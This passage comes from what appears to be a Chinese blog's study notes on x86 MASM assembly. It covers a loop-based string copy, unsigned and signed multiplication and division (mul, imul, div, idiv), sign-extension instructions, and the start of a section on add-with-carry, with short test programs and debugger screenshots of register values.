<h2 id="利用loop进行字符串拷贝"><a class="anchor" href="#利用loop进行字符串拷贝">#</a> 利用 loop 进行字符串拷贝</h2>
<h3 id="测试样例"><a class="anchor" href="#测试样例">#</a> 测试样例</h3>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">.586</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">.</span>MODEL flat<span class="token punctuation">,</span> stdcall</pre></td></tr><tr><td data-num="3"></td><td><pre>option casemap<span class="token operator">:</span>none</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>include windows<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="6"></td><td><pre>include user32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="7"></td><td><pre>include kernel32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="8"></td><td><pre>include msvcrt<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>includelib user32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="11"></td><td><pre>includelib kernel32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="12"></td><td><pre>includelib msvcrt<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">.</span>data</pre></td></tr><tr><td data-num="15"></td><td><pre>source byte <span class="token string">"My name is 21r000"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">;</span>源字符串</pre></td></tr><tr><td data-num="16"></td><td><pre>target byte <span class="token keyword">sizeof</span> source <span class="token function">dup</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>目的字符串</pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token punctuation">;</span>利用<span class="token keyword">sizeof</span>伪指令计算源字符串大小</pre></td></tr><tr><td data-num="18"></td><td><pre></pre></td></tr><tr><td data-num="19"></td><td><pre></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token punctuation">.</span>code</pre></td></tr><tr><td data-num="21"></td><td><pre>main proc</pre></td></tr><tr><td data-num="22"></td><td><pre>	mov esi<span class="token punctuation">,</span><span class="token number">0</span></pre></td></tr><tr><td data-num="23"></td><td><pre>	mov ecx<span class="token punctuation">,</span><span class="token keyword">sizeof</span> source<span class="token punctuation">;</span>计算有效元素个数</pre></td></tr><tr><td data-num="24"></td><td><pre>lp<span class="token operator">:</span></pre></td></tr><tr><td data-num="25"></td><td><pre>	mov al<span class="token punctuation">,</span>source<span class="token punctuation">[</span>esi<span class="token punctuation">]</span><span class="token punctuation">;</span>获取第esi个字符</pre></td></tr><tr><td data-num="26"></td><td><pre>	mov target<span class="token punctuation">[</span>esi<span class="token punctuation">]</span><span class="token punctuation">,</span>al<span class="token punctuation">;</span>将源字符串存入目标字符串</pre></td></tr><tr><td data-num="27"></td><td><pre>	inc esi<span class="token punctuation">;</span><span class="token operator">++</span></pre></td></tr><tr><td data-num="28"></td><td><pre>	loop lp<span class="token punctuation">;</span>执行循环</pre></td></tr><tr><td data-num="29"></td><td><pre>	push <span class="token number">0</span></pre></td></tr><tr><td data-num="30"></td><td><pre>	call ExitProcess</pre></td></tr><tr><td data-num="31"></td><td><pre>	add esp<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="32"></td><td><pre>main ENDP</pre></td></tr><tr><td data-num="33"></td><td><pre>END main</pre></td></tr></table></figure><p>可以看到 <code>mov ecx,sizeof source</code>  计算了有效元素个数</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220124210911818.png" alt="image-20220124210911818" /></p>
<p>取地址查看 <code>&amp;target</code> ，可以发现目标字符串已完成拷贝。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220124211120794.png" alt="image-20220124211120794" /></p>
]]></content>
      <categories>
        <category>汇编</category>
      </categories>
      <tags>
        <tag>汇编</tag>
      </tags>
  </entry>
  <entry>
    <title>汇编语言Studying Note之乘法与除法指令and扩展加减法学习</title>
    <url>/article/c66b0376.html</url>
    <content><![CDATA[<p>2022 年，祝大家虎虎生威，在新的一年里如虎添 &quot;亿&quot;！</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/6552ACE61B22AF9BF38AF19117707646.gif" alt="image-6552ACE61B22AF9BF38AF19117707646" /></p>
<h1 id="乘法与除法指令"><a class="anchor" href="#乘法与除法指令">#</a> 乘法与除法指令</h1>
<h2 id="乘法mulimul"><a class="anchor" href="#乘法mulimul">#</a> 乘法 mul/imul</h2>
<p><strong>符号</strong></p>
<ul>
<li>
<p>无符号：mul div</p>
</li>
<li>
<p>有符号：imul idiv</p>
</li>
</ul>
<p><strong>元素</strong></p>
<ul>
<li>
<p>乘数：bl bx ebx</p>
</li>
<li>
<p>被乘数：al ax eax</p>
</li>
</ul>
<h3 id="无符号测试"><a class="anchor" href="#无符号测试">#</a> 无符号测试</h3>
<h4 id="八位乘法"><a class="anchor" href="#八位乘法">#</a> 八位乘法</h4>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">.586</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">.</span>MODEL flat<span class="token punctuation">,</span> stdcall</pre></td></tr><tr><td data-num="3"></td><td><pre>option casemap<span class="token operator">:</span>none</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>include windows<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="6"></td><td><pre>include user32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="7"></td><td><pre>include kernel32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="8"></td><td><pre>include msvcrt<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>includelib user32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="11"></td><td><pre>includelib kernel32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="12"></td><td><pre>includelib msvcrt<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">.</span>data</pre></td></tr><tr><td data-num="15"></td><td><pre>i dword <span class="token number">0</span></pre></td></tr><tr><td data-num="16"></td><td><pre></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token punctuation">.</span>code</pre></td></tr><tr><td data-num="18"></td><td><pre>main proc</pre></td></tr><tr><td data-num="19"></td><td><pre>	xor eax<span class="token punctuation">,</span>eax<span class="token punctuation">;</span>清零</pre></td></tr><tr><td data-num="20"></td><td><pre>	mov al<span class="token punctuation">,</span><span class="token number">5</span>h</pre></td></tr><tr><td data-num="21"></td><td><pre>	mov bl<span class="token punctuation">,</span><span class="token number">10</span>h</pre></td></tr><tr><td data-num="22"></td><td><pre>	mul bl</pre></td></tr><tr><td data-num="23"></td><td><pre>	push <span class="token number">0</span></pre></td></tr><tr><td data-num="24"></td><td><pre>	call ExitProcess</pre></td></tr><tr><td data-num="25"></td><td><pre>	add esp<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="26"></td><td><pre>main ENDP</pre></td></tr><tr><td data-num="27"></td><td><pre>END main</pre></td></tr></table></figure><p><strong>运行测试</strong></p>
<p>eax = 5</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220204162659125.png" alt="image-20220204162659125" /></p>
<p>ebx = 10</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220204162716471.png" alt="image-20220204162716471" /></p>
<p>eax = 50</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220204162730441.png" alt="image-20220204162730441" /></p>
<h4 id="十六位乘法"><a class="anchor" href="#十六位乘法">#</a> 十六位乘法</h4>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">.586</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">.</span>MODEL flat<span class="token punctuation">,</span> stdcall</pre></td></tr><tr><td data-num="3"></td><td><pre>option casemap<span class="token operator">:</span>none</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>include windows<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="6"></td><td><pre>include user32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="7"></td><td><pre>include kernel32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="8"></td><td><pre>include msvcrt<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>includelib user32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="11"></td><td><pre>includelib kernel32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="12"></td><td><pre>includelib msvcrt<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">.</span>data</pre></td></tr><tr><td data-num="15"></td><td><pre>i dword <span class="token number">0</span></pre></td></tr><tr><td data-num="16"></td><td><pre></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token punctuation">.</span>code</pre></td></tr><tr><td data-num="18"></td><td><pre>main proc</pre></td></tr><tr><td data-num="19"></td><td><pre>	xor eax<span class="token punctuation">,</span>eax<span class="token punctuation">;</span>清零</pre></td></tr><tr><td data-num="20"></td><td><pre>	xor edx<span class="token punctuation">,</span>edx</pre></td></tr><tr><td data-num="21"></td><td><pre>	mov ax<span class="token punctuation">,</span><span class="token number">2000</span>h</pre></td></tr><tr><td data-num="22"></td><td><pre>	mov bx<span class="token punctuation">,</span><span class="token number">100</span>h</pre></td></tr><tr><td data-num="23"></td><td><pre>	mul bx</pre></td></tr><tr><td data-num="24"></td><td><pre>	push <span class="token number">0</span></pre></td></tr><tr><td data-num="25"></td><td><pre>	call ExitProcess</pre></td></tr><tr><td data-num="26"></td><td><pre>	add esp<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="27"></td><td><pre>main ENDP</pre></td></tr><tr><td data-num="28"></td><td><pre>END main</pre></td></tr></table></figure><p><strong>运行测试</strong></p>
<p>eax = 2000</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220204163308096.png" alt="image-20220204163308096" /></p>
<p>ebx = 100</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220204163322166.png" alt="image-20220204163322166" /></p>
<p>edx = 20，也即 00200000</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220204163338775.png" alt="image-20220204163338775" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220204163444599.png" alt="image-20220204163444599" /></p>
<h4 id="32位乘法"><a class="anchor" href="#32位乘法">#</a> 32 位乘法</h4>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">.586</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">.</span>MODEL flat<span class="token punctuation">,</span> stdcall</pre></td></tr><tr><td data-num="3"></td><td><pre>option casemap<span class="token operator">:</span>none</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>include windows<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="6"></td><td><pre>include user32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="7"></td><td><pre>include kernel32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="8"></td><td><pre>include msvcrt<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>includelib user32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="11"></td><td><pre>includelib kernel32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="12"></td><td><pre>includelib msvcrt<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">.</span>data</pre></td></tr><tr><td data-num="15"></td><td><pre>i dword <span class="token number">0</span></pre></td></tr><tr><td data-num="16"></td><td><pre></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token punctuation">.</span>code</pre></td></tr><tr><td data-num="18"></td><td><pre>main proc</pre></td></tr><tr><td data-num="19"></td><td><pre>	xor eax<span class="token punctuation">,</span>eax<span class="token punctuation">;</span>清零</pre></td></tr><tr><td data-num="20"></td><td><pre>	xor edx<span class="token punctuation">,</span>edx</pre></td></tr><tr><td data-num="21"></td><td><pre>	mov eax<span class="token punctuation">,</span><span class="token number">12345</span>h</pre></td></tr><tr><td data-num="22"></td><td><pre>	mov ebx<span class="token punctuation">,</span><span class="token number">1000</span>h</pre></td></tr><tr><td data-num="23"></td><td><pre>	mul ebx</pre></td></tr><tr><td data-num="24"></td><td><pre>	push <span class="token number">0</span></pre></td></tr><tr><td data-num="25"></td><td><pre>	call ExitProcess</pre></td></tr><tr><td data-num="26"></td><td><pre>	add esp<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="27"></td><td><pre>main ENDP</pre></td></tr><tr><td data-num="28"></td><td><pre>END main</pre></td></tr></table></figure><p><strong>运行测试</strong></p>
<p>eax = 12345</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220204164654094.png" alt="image-20220204164654094" /></p>
<p>ebx = 1000</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220204164804220.png" alt="image-20220204164804220" /></p>
<p>eax = 12345000</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220204164820611.png" alt="image-20220204164820611" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220204165002073.png" alt="image-20220204165002073" /></p>
<p>以上就是无符号运算的测试结果，接下来进行有符号的乘法运算测试。</p>
<h3 id="有符号测试"><a class="anchor" href="#有符号测试">#</a> 有符号测试</h3>
<p>首先我们要知道的是 imul 执行有符号的乘法不同于 mul 执行无符号的乘法的地方是：imul 会保持乘积的符号。</p>
<p>它实现的方法就是把这个乘积的低半部分的一个最高位的符号扩展到高半部分上去。</p>
<p>另外 imul 的三种模式分为</p>
<ul>
<li>一个操作数：乘积放在 ax，bx 中，类似于 mul</li>
<li>两个操作数：乘积放在第一个操作数中，此时这个操作数必须是一个寄存器</li>
<li>三个操作数：后两个操作数的运算结果存放到操作数一当中，且第三个操作数为立即数</li>
</ul>
<h4 id="双操作数测试"><a class="anchor" href="#双操作数测试">#</a> 双操作数测试</h4>
<p><strong>测试样例</strong></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">.586</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">.</span>MODEL flat<span class="token punctuation">,</span> stdcall</pre></td></tr><tr><td data-num="3"></td><td><pre>option casemap<span class="token operator">:</span>none</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>include windows<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="6"></td><td><pre>include user32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="7"></td><td><pre>include kernel32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="8"></td><td><pre>include msvcrt<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>includelib user32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="11"></td><td><pre>includelib kernel32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="12"></td><td><pre>includelib msvcrt<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">.</span>data</pre></td></tr><tr><td data-num="15"></td><td><pre>i dword <span class="token number">0</span></pre></td></tr><tr><td data-num="16"></td><td><pre></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token punctuation">.</span>code</pre></td></tr><tr><td data-num="18"></td><td><pre>main proc</pre></td></tr><tr><td data-num="19"></td><td><pre>	xor eax<span class="token punctuation">,</span>eax<span class="token punctuation">;</span>清零</pre></td></tr><tr><td data-num="20"></td><td><pre>	xor edx<span class="token punctuation">,</span>edx</pre></td></tr><tr><td data-num="21"></td><td><pre>	mov eax<span class="token punctuation">,</span><span class="token number">12345</span>h</pre></td></tr><tr><td data-num="22"></td><td><pre>	mov ebx<span class="token punctuation">,</span><span class="token number">1000</span>h</pre></td></tr><tr><td data-num="23"></td><td><pre>	imul eax<span class="token punctuation">,</span>ebx</pre></td></tr><tr><td data-num="24"></td><td><pre>	push <span class="token number">0</span></pre></td></tr><tr><td data-num="25"></td><td><pre>	call ExitProcess</pre></td></tr><tr><td data-num="26"></td><td><pre>	add esp<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="27"></td><td><pre>main ENDP</pre></td></tr><tr><td data-num="28"></td><td><pre>END main</pre></td></tr></table></figure><p><strong>运行测试</strong></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220204182830693.png" alt="image-20220204182830693" /></p>
<p>更改 ebx = 100000h 时，可以看到 eax 已经溢出，但是并没有存放到 edx 中</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220204182917791.png" alt="image-20220204182917791" /></p>
<p>也即运行结果存放在第一个操作数当中，此时其相当于一个寄存器。</p>
<h4 id="三操作数测试"><a class="anchor" href="#三操作数测试">#</a> 三操作数测试</h4>
<p><strong>测试样例</strong></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">.586</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">.</span>MODEL flat<span class="token punctuation">,</span> stdcall</pre></td></tr><tr><td data-num="3"></td><td><pre>option casemap<span class="token operator">:</span>none</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>include windows<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="6"></td><td><pre>include user32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="7"></td><td><pre>include kernel32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="8"></td><td><pre>include msvcrt<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>includelib user32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="11"></td><td><pre>includelib kernel32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="12"></td><td><pre>includelib msvcrt<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">.</span>data</pre></td></tr><tr><td data-num="15"></td><td><pre>i dword <span class="token number">0</span></pre></td></tr><tr><td data-num="16"></td><td><pre></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token punctuation">.</span>code</pre></td></tr><tr><td data-num="18"></td><td><pre>main proc</pre></td></tr><tr><td data-num="19"></td><td><pre>	xor eax<span class="token punctuation">,</span>eax<span class="token punctuation">;</span>清零</pre></td></tr><tr><td data-num="20"></td><td><pre>	xor edx<span class="token punctuation">,</span>edx</pre></td></tr><tr><td data-num="21"></td><td><pre>	mov eax<span class="token punctuation">,</span><span class="token number">12345</span>h</pre></td></tr><tr><td data-num="22"></td><td><pre>	<span class="token punctuation">;</span>mov ebx<span class="token punctuation">,</span><span class="token number">100000</span>h</pre></td></tr><tr><td data-num="23"></td><td><pre>	imul edx<span class="token punctuation">,</span>eax<span class="token punctuation">,</span><span class="token number">12</span></pre></td></tr><tr><td data-num="24"></td><td><pre>	push <span class="token number">0</span></pre></td></tr><tr><td data-num="25"></td><td><pre>	call ExitProcess</pre></td></tr><tr><td data-num="26"></td><td><pre>	add esp<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="27"></td><td><pre>main ENDP</pre></td></tr><tr><td data-num="28"></td><td><pre>END main</pre></td></tr></table></figure><p><strong>运行测试</strong></p>
<p>eax = 12345h</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220204183625596.png" alt="image-20220204183625596" /></p>
<p>可以看到计算存放在 edx 中，也即第一个操作数当中</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220204183703000.png" alt="image-20220204183703000" /></p>
<h2 id="除法dividiv"><a class="anchor" href="#除法dividiv">#</a> 除法 div/idiv</h2>
<p><strong>元素</strong></p>
<ul>
<li>除数</li>
<li>被除数</li>
<li>商</li>
<li>余数</li>
</ul>
<p><strong>使用格式</strong></p>
<ul>
<li>div mem/reg (除数)</li>
</ul>
<p>可以时内存或寄存器，但不能是立即数</p>
<p><strong>被除数</strong></p>
<ul>
<li>八位：AX</li>
<li>十六位：DX:ax</li>
<li>32 位：edx:eax</li>
</ul>
<p><strong>商和余数</strong></p>
<ul>
<li>八位：al ah</li>
<li>十六位：ax dx</li>
<li>32 位：eax edx</li>
</ul>
<h3 id="八位十六寄存器"><a class="anchor" href="#八位十六寄存器">#</a> 八位十六寄存器</h3>
<p><strong>测试样例</strong></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">.586</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">.</span>MODEL flat<span class="token punctuation">,</span> stdcall</pre></td></tr><tr><td data-num="3"></td><td><pre>option casemap<span class="token operator">:</span>none</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>include windows<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="6"></td><td><pre>include user32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="7"></td><td><pre>include kernel32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="8"></td><td><pre>include msvcrt<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>includelib user32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="11"></td><td><pre>includelib kernel32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="12"></td><td><pre>includelib msvcrt<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">.</span>data</pre></td></tr><tr><td data-num="15"></td><td><pre>i dword <span class="token number">0</span></pre></td></tr><tr><td data-num="16"></td><td><pre></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token punctuation">.</span>code</pre></td></tr><tr><td data-num="18"></td><td><pre>main proc</pre></td></tr><tr><td data-num="19"></td><td><pre>	xor eax<span class="token punctuation">,</span>eax<span class="token punctuation">;</span>清零</pre></td></tr><tr><td data-num="20"></td><td><pre>	xor edx<span class="token punctuation">,</span>edx</pre></td></tr><tr><td data-num="21"></td><td><pre>	mov ax<span class="token punctuation">,</span><span class="token number">100</span></pre></td></tr><tr><td data-num="22"></td><td><pre>	mov bl<span class="token punctuation">,</span><span class="token number">2</span></pre></td></tr><tr><td data-num="23"></td><td><pre>	div bl</pre></td></tr><tr><td data-num="24"></td><td><pre>	push <span class="token number">0</span></pre></td></tr><tr><td data-num="25"></td><td><pre>	call ExitProcess</pre></td></tr><tr><td data-num="26"></td><td><pre>	add esp<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="27"></td><td><pre>main ENDP</pre></td></tr><tr><td data-num="28"></td><td><pre>END main</pre></td></tr></table></figure><p><strong>运行测试</strong></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220204185032764.png" alt="image-20220204185032764" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220204185052140.png" alt="image-20220204185052140" /></p>
<p>计算结果</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220204185112552.png" alt="image-20220204185112552" /></p>
<p>可以看到商为 50，余数为 0</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220204185242669.png" alt="image-20220204185242669" /></p>
<p>将 ax 换成 101 进行测试</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220204185354706.png" alt="image-20220204185354706" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220204185410056.png" alt="image-20220204185410056" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220204185424905.png" alt="image-20220204185424905" /></p>
<p>此时可以看到余数为 1</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220204185448374.png" alt="image-20220204185448374" /></p>
<p>idiv 基本与 div 相同，但在执行前需要对除数进行包扩展，把一个数的最高位复制到包含这个数的变量或寄存器的高位中。</p>
<p><strong>三种扩展指令</strong></p>
<ul>
<li>cbw   字节转字</li>
<li>cwd   字转双字：ax 的符号位扩展到 dx 中</li>
<li>cdq    双字转四字：eax 的符号位扩展到 edx 中</li>
</ul>
<p><strong>测试样例</strong></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">.586</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">.</span>MODEL flat<span class="token punctuation">,</span> stdcall</pre></td></tr><tr><td data-num="3"></td><td><pre>option casemap<span class="token operator">:</span>none</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>include windows<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="6"></td><td><pre>include user32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="7"></td><td><pre>include kernel32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="8"></td><td><pre>include msvcrt<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>includelib user32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="11"></td><td><pre>includelib kernel32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="12"></td><td><pre>includelib msvcrt<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">.</span>data</pre></td></tr><tr><td data-num="15"></td><td><pre>val sbyte <span class="token operator">-</span><span class="token number">48</span></pre></td></tr><tr><td data-num="16"></td><td><pre></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token punctuation">.</span>code</pre></td></tr><tr><td data-num="18"></td><td><pre>main proc</pre></td></tr><tr><td data-num="19"></td><td><pre>    xor eax<span class="token punctuation">,</span>eax</pre></td></tr><tr><td data-num="20"></td><td><pre>    xor ebx<span class="token punctuation">,</span>ebx</pre></td></tr><tr><td data-num="21"></td><td><pre>    xor edx<span class="token punctuation">,</span>edx</pre></td></tr><tr><td data-num="22"></td><td><pre>	mov al<span class="token punctuation">,</span>val</pre></td></tr><tr><td data-num="23"></td><td><pre>	cwd</pre></td></tr><tr><td data-num="24"></td><td><pre>	mov bl<span class="token punctuation">,</span><span class="token operator">+</span><span class="token number">5</span></pre></td></tr><tr><td data-num="25"></td><td><pre>	idiv bl</pre></td></tr><tr><td data-num="26"></td><td><pre>	push <span class="token number">0</span></pre></td></tr><tr><td data-num="27"></td><td><pre>	call ExitProcess</pre></td></tr><tr><td data-num="28"></td><td><pre>	add esp<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="29"></td><td><pre>main ENDP</pre></td></tr><tr><td data-num="30"></td><td><pre>END main</pre></td></tr></table></figure><p><strong>运行测试</strong></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220204190942744.png" alt="image-20220204190942744" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220204190956972.png" alt="image-20220204190956972" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220204191014352.png" alt="image-20220204191014352" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220204191027968.png" alt="image-20220204191027968" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220204191044977.png" alt="image-20220204191044977" /></p>
<h1 id="扩展加减法"><a class="anchor" href="#扩展加减法">#</a> 扩展加减法</h1>
<h2 id="加法"><a class="anchor" href="#加法">#</a> 加法</h2>
<p>进位加法 adc：将原操作数与进位标志位的值和目的操作数都相加，使用格式与 ad 一样</p>
<p><strong>样例</strong></p>
